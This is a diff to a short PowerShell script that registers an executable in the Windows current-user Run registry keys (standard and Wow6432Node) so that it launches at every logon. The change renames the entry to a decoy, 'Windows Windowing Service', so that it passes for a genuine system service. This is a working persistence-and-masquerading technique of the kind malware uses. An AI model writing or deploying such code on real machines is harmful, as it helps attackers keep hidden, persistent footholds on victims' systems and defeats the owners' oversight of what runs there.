@@ -1,12 +1,13 @@
 #Commands to add exe to registry
 
-$PathtoExe = "C:\Users\user\Documents\tool.exe"
-$DecoyName = "Windows Windowing Service"
+
 
 #####User current
-
+$PathtoExe = "C:\Users\user\Documents\tool.exe"
+$DecoyName = "Windows Windowing Service"
 $Reg = "HKCU:SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
-New-ItemProperty -path $Reg -name "Anything" -value $PathtoEXE -propertytype "string"
+
+New-ItemProperty -path $Reg -name $DecoyName -value $PathtoEXE -propertytype "string"
 
 #Only works on 64 bt
 $Reg = "HKCU:SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run"
